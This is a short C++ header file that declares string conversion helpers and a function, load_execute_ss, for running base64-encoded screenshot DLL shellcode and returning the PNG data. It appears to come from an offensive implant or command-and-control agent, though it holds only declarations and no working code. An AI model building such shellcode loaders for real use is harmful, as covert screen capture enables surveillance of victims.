#pragma once

#include <string>

// Converts std::wstring to std::string
std::string toString(const std::wstring &wide);

// Converts std::string to std::wstring
std::wstring toWstring(const std::string &narrow);

// Executes screenshot DLL shellcode (already base64-encoded)
// Writes output to outPNG (a wide string containing the PNG data)
// Returns 0 on success, non-zero on failure
int load_execute_ss(const std::string &shellcodeB64, std::wstring &outPNG);
